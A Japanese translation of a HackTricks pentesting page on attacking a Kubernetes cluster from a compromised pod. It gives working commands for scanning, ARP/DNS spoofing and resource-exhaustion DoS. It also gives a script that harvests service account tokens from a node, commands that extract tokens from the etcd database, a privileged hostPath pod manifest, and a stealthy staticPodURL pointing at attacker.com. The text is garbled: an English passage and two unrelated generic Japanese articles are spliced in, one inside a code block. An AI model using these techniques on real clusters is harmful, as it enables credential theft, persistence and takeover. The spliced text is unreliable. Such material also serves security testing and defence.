# Pod内からKubernetesを攻撃する

<details>

<summary><strong>HackTricksをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを見たい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、PRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに参加してください。**

</details>

## **Pod Breakout**

**運が良ければ、ノードから脱出することができるかもしれません：**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Podからの脱出

Podから脱出するためには、まず**特権を昇格**する必要があります。これを行うためのいくつかのテクニックがあります：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

以下の**docker breakouts**をチェックして、侵害したPodから脱出しようとしてみてください：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetes特権の乱用

**Kubernetes列挙**のセクションで説明されているように：

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

通常、Podは内部に**サービスアカウントトークン**を持って実行されます。このサービスアカウントには、クラスタ内の他のPodに**移動**したり、クラスタ内のノードに**脱出**したりするために**悪用できる特権**が付与されている場合があります。次の方法を確認してください：

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### クラウド特権の乱用

Podが**クラウド環境**内で実行されている場合、**メタデータエンドポイント**からトークンを**漏洩**させ、それを使用して特権を昇格させることができるかもしれません。

## 脆弱なネットワークサービスの検索

Kubernetes環境内にいるため、現在のPodの特権を乱用して特権を昇格させることができず、コンテナから脱出することができない場合は、**潜在的に脆弱なサービスを検索**する必要があります。

### サービス

**この目的のために、Kubernetes環境のすべてのサービスを取得**してみてください：
```
kubectl get svc --all-namespaces
```
デフォルトでは、Kubernetesはフラットなネットワーキングスキーマを使用しており、これはクラスタ内の任意のポッド/サービスが他のポッド/サービスと通信できることを意味します。クラスタ内の名前空間はデフォルトではネットワークセキュリティの制限を持っていません。名前空間内の誰でも他の名前空間と通信できます。

### スキャン

次のBashスクリプト（[Kubernetesワークショップ](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)から取得）は、KubernetesクラスタのIP範囲をインストールしてスキャンします：
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
以下のページをチェックして、**Kubernetes固有のサービスを攻撃**して、**他のポッド/環境全体を侵害**する方法を学びましょう：

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### スニッフィング

**侵害されたポッドがいくつかの機密サービスを実行**しており、他のポッドが認証する必要がある場合、**ローカル通信をスニッフィング**することで、他のポッドから送信される資格情報を取得することができるかもしれません。

## ネットワークスプーフィング

デフォルトでは、**ARPスプーフィング**（およびそれによる**DNSスプーフィング**）のような技術はKubernetesネットワークで機能します。そのため、ポッド内では、デフォルトで**NET\_RAW機能**がある場合、カスタムのネットワークパケットを送信し、**同じノードで実行されているすべてのポッドに対してARPスプーフィングを使用したMitM攻撃を実行**することができます。\
さらに、**悪意のあるポッド**が**DNSサーバーと同じノードで実行**されている場合、クラスタ内のすべてのポッドに対して**DNSスプーフィング攻撃**を実行することができます。

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## ノードDoS

Kubernetesマニフェストにはリソースの仕様がなく、コンテナには**適用される制限範囲がありません**。攻撃者として、**ポッド/デプロイメントが実行されているリソースをすべて消費**し、他のリソースを枯渇させ、環境にDoSを引き起こすことができます。

これは、[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)などのツールを使用して行うことができます。
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
`stress-ng`を実行している間とその後の違いを確認できます。
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## ノードのポストエクスプロイテーション

もし、コンテナから脱出に成功した場合、ノード内で以下の興味深い情報を見つけることができます:

* コンテナランタイムプロセス（Docker）
* このコンテナのように乱用できる、ノード内で実行されている他のポッド/コンテナ（より多くのトークン）
* ファイルシステム全体と一般的なOS
* リッスンしているKube-Proxyサービス
* リッスンしているKubeletサービス。設定ファイルを確認してください:
* ディレクトリ: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* その他のKubernetes共通ファイル:
* `$HOME/.kube/config` - ユーザー設定
* `/etc/kubernetes/kubelet.conf`- 通常の設定
* `/etc/kubernetes/bootstrap-kubelet.conf` - ブートストラップ設定
* `/etc/kubernetes/manifests/etcd.yaml` - etcdの設定
* `/etc/kubernetes/pki` - Kubernetesキー

### ノードのkubeconfigを見つける

先述のパスのいずれにもkubeconfigファイルが見つからない場合は、kubeletプロセスの引数`--kubeconfig`を確認してください:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### 秘密の盗み出し

To steal secrets from within a pod, you can use various techniques:

1. **Pod-to-Pod Communication**: If the target pod communicates with other pods, you can intercept the network traffic to capture any sensitive information being transmitted.

2. **Pod-to-Service Communication**: Similarly, if the target pod communicates with services within the cluster, you can intercept the network traffic to capture any sensitive information being transmitted.

3. **Pod-to-External Communication**: If the target pod communicates with external resources, such as databases or APIs, you can intercept the network traffic to capture any sensitive information being transmitted.

4. **Pod Logs**: Check the logs of the target pod for any sensitive information that might have been logged, such as credentials or API keys.

5. **Pod Environment Variables**: Inspect the environment variables of the target pod to see if any sensitive information, such as passwords or tokens, is being stored as environment variables.

6. **Pod Mounted Volumes**: If the target pod has mounted volumes, you can explore the contents of these volumes to search for any sensitive files or configuration files that might contain secrets.

Remember to always follow ethical guidelines and obtain proper authorization before attempting any hacking activities.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
スクリプト[**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)は、他のポッドのトークンを自動的に取得し、それらが探している権限を持っているかどうかをチェックします（1つずつ確認する代わりに）。
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### 特権のあるDaemonSets

DaemonSetは、**クラスタのすべてのノードで実行される** **ポッド**です。したがって、特権のあるサービスアカウントで構成されたDaemonSetの場合、**すべてのノード**でその**特権のあるサービスアカウントのトークン**を見つけることができ、それを悪用することができます。

この攻撃手法は前のセクションと同じですが、今回は運に頼る必要がありません。

### クラウドへのピボット

クラスタがクラウドサービスによって管理されている場合、通常、**ノードはポッドとは異なるアクセス権限でメタデータエンドポイントにアクセス**できます。そのため、ノードからメタデータエンドポイントにアクセスしようとしてください（またはhostNetworkがTrueのポッドから）：

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcdの盗み出し

コンテナを実行するノードの[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)を指定できる場合、コントロールプレーンノード内でシェルを取得し、**etcdデータベース**を取得します。
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
コントロールプレーンノードは**マスターの役割**を持ち、**クラウド管理クラスタではそれらに何も実行できません**。

#### etcdからシークレットを読み取る

ポッドの仕様で`nodeName`セレクタを使用してコントロールプレーンノード上でポッドを実行できる場合、クラスタのすべての設定、シークレットを含む`etcd`データベースに簡単にアクセスできるかもしれません。

以下は、コントロールプレーンノード上で`etcd`が実行されている場合に、`etcd`からシークレットを取得するためのクイックで汚い方法です。もし、よりエレガントな解決策を望む場合は、`etcdctl`という`etcd`クライアントユーティリティを使用してポッドを起動し、コントロールプレーンノードの認証情報を使用して実行中のetcdに接続する、[この例のマニフェスト](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)を参照してください（@mauilionから）。

**コントロールプレーンノードで`etcd`が実行されているかどうかを確認し、データベースがどこにあるかを確認します（これは`kubeadm`で作成されたクラスタの場合です）**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Kubernetes内のポッドからの攻撃

このセクションでは、Kubernetesクラスタ内のポッドからの攻撃について説明します。ポッド内からの攻撃は、クラスタ内の他のリソースに対して権限を持つ攻撃者によって行われる可能性があります。

## 1. ポッド内の情報収集

攻撃者は、ポッド内で実行されているコンテナやプロセスに関する情報を収集することができます。これには、次のような手法があります。

### 1.1. プロセスリストの取得

攻撃者は、`ps`コマンドを使用してポッド内の実行中のプロセスのリストを取得することができます。

```bash
ps aux
```

### 1.2. ネットワーク接続の確認

攻撃者は、`netstat`コマンドを使用してポッド内のネットワーク接続を確認することができます。

```bash
netstat -tuln
```

### 1.3. ファイルシステムの調査

攻撃者は、ポッド内のファイルシステムを調査することで、重要なファイルや構成情報を見つけることができます。

```bash
ls -la /
```

## 2. ポッド内の特権の昇格

攻撃者は、ポッド内で特権の昇格を試みることができます。特権の昇格には、次のような手法があります。

### 2.1. SUID/SGIDバイナリの検索

攻撃者は、SUID（Set User ID）やSGID（Set Group ID）ビットが設定されたバイナリを検索し、特権の昇格に利用することができます。

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

### 2.2. プロセスの乗っ取り

攻撃者は、ポッド内の別のプロセスを乗っ取ることで特権の昇格を試みることができます。

```bash
ps aux | grep -v "grep" | grep "root"
```

## 3. ポッド内の他のリソースへの攻撃

攻撃者は、ポッド内から他のリソースへの攻撃を試みることができます。これには、次のような手法があります。

### 3.1. ポッド間通信の傍受

攻撃者は、ポッド間の通信を傍受することで、機密情報を取得することができます。

```bash
tcpdump -i any -w capture.pcap
```

### 3.2. クラスタ内の他のポッドへの攻撃

攻撃者は、ポッド内からクラスタ内の他のポッドに攻撃を仕掛けることができます。

```bash
curl http://<target-pod-ip>
```

### 3.3. クラスタ内の他のリソースへの攻撃

攻撃者は、ポッド内からクラスタ内の他のリソース（サービス、デプロイメントなど）に攻撃を仕掛けることができます。

```bash
kubectl exec -it <target-pod> -- <command>
```

以上が、ポッド内からの攻撃に関する基本的な情報です。攻撃者がポッド内に侵入した場合、クラスタ内の他のリソースに対して権限を持つ可能性があるため、セキュリティ対策が重要です。
```bash
data-dir=/var/lib/etcd
```
**etcdデータベースのデータを表示する：**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**データベースからトークンを抽出し、サービスアカウント名を表示します**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**同じコマンドですが、grepsを使用してkube-system名前空間でデフォルトトークンのみを返すようにします**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Kubernetes内のポッドからの攻撃

このセクションでは、Kubernetesクラスタ内のポッドからの攻撃について説明します。ポッド内からの攻撃は、クラスタ内の他のリソースに対して権限を持つ攻撃者によって行われる可能性があります。

## 1. ポッド内の情報収集

攻撃者は、ポッド内で実行されているコンテナやプロセスに関する情報を収集することができます。これには、次のような手法があります。

### 1.1. プロセスリストの取得

攻撃者は、`ps`コマンドを使用してポッド内の実行中のプロセスのリストを取得することができます。

```bash
$ ps aux
```

### 1.2. ネットワーク接続の確認

攻撃者は、`netstat`コマンドを使用してポッド内のネットワーク接続を確認することができます。

```bash
$ netstat -tuln
```

### 1.3. ファイルシステムの調査

攻撃者は、ポッド内のファイルシステムを調査することで、重要なファイルや構成情報を見つけることができます。

```bash
$ ls -la /
```

## 2. ポッド内の特権の昇格

攻撃者は、ポッド内で特権の昇格を試みることができます。特権の昇格には、次のような手法があります。

### 2.1. SUID/SGIDバイナリの検索

攻撃者は、SUID（Set User ID）やSGID（Set Group ID）ビットが設定されたバイナリを検索し、特権の昇格に利用することができます。

```bash
$ find / -perm -4000 -type f 2>/dev/null
$ find / -perm -2000 -type f 2>/dev/null
```

### 2.2. カーネルの脆弱性の利用

攻撃者は、ポッド内のカーネルに存在する脆弱性を利用して特権の昇格を試みることができます。

## 3. ポッド内の他のリソースへの攻撃

攻撃者は、ポッド内から他のリソースへの攻撃を試みることができます。これには、次のような手法があります。

### 3.1. ポッド間通信の傍受

攻撃者は、ポッド間の通信を傍受することで、機密情報を盗むことができます。

### 3.2. クラスタ内の他のポッドへの攻撃

攻撃者は、ポッド内からクラスタ内の他のポッドに対して攻撃を行うことができます。これには、ポッド間通信の傍受、ポッドへの攻撃、およびポッドの情報漏洩などの手法が含まれます。

## 4. 対策

ポッド内からの攻撃を防ぐためには、次の対策を実施することが重要です。

- ポッド内のセキュリティを強化する
- ポッド間通信の暗号化を実施する
- ポッド内の特権の昇格を防ぐ
- ポッドのセキュリティコンテキストを適切に設定する

以上が、Kubernetes内のポッドからの攻撃に関する情報です。攻撃者がポッド内から他のリソースにアクセスすることを防ぐために、適切な対策を実施することが重要です。
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### 静的/ミラーポッドの永続性

_静的ポッド_は、APIサーバーが監視せずに、特定のノード上のkubeletデーモンによって直接管理されます。デプロイメントなどのコントロールプレーンによって管理されるポッドとは異なり、**kubeletは各静的ポッドを監視し、失敗した場合に再起動します**。

したがって、静的ポッドは常に特定のノード上の**1つのKubeletにバインドされます**。

**kubeletは自動的にKubernetes APIサーバー上にミラーポッドを作成**しようとします。これにより、ノード上で実行されているポッドはAPIサーバー上で表示されますが、そこから制御することはできません。ポッド名は、ノードのホスト名に先行するハイフンで接尾辞が付きます。

{% hint style="danger" %}
静的ポッドの**`spec`は他のAPIオブジェクトを参照することはできません**（たとえば、ServiceAccount、ConfigMap、Secretなど）。したがって、現在のノードで任意のserviceAccountを使用してポッドを起動してクラスタを危険にさらすことはできません。ただし、これを使用して異なる名前空間でポッドを実行することはできます（何らかの理由で便利な場合）。
{% endhint %}

ノードホスト内にいる場合、**自身の内部に静的ポッドを作成**することができます。これは非常に便利です、なぜならこれにより**kube-system**のような**異なる名前空間にポッドを作成**することができるからです。

静的ポッドを作成するには、[**ドキュメントが大いに役立ちます**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)。基本的には2つのことが必要です：

* **kubeletサービス**または**kubelet構成**（[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)）でパラメータ**`--pod-manifest-path=/etc/kubernetes/manifests`**を設定し、サービスを再起動します。
* **`/etc/kubernetes/manifests`**の**ポッド定義**に定義を作成します。

**もう1つのよりステルスな方法は次のとおりです：**

* **kubelet**構成ファイルのパラメータ**`staticPodURL`**を変更し、`staticPodURL: http://attacker.com:8765/pod.yaml`のように設定します。これにより、kubeletプロセスが指定されたURLから**構成を取得して静的ポッドを作成**します。

[**ここ**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)から取得した、**kube-system**に特権ポッドを作成するための**ポッド**の設定の**例**：
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### ポッドの削除 + スケジュール不可ノード

攻撃者が**ノードを侵害**し、他のノードから**ポッドを削除**し、他のノードで**ポッドを実行できなくする**ことができる場合、ポッドは侵害されたノードで再実行され、彼はそれらで実行されるトークンを**盗むことができます**。\
[**詳細については、このリンクを参照してください**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)。

## 自動ツール

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSにアクセスしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
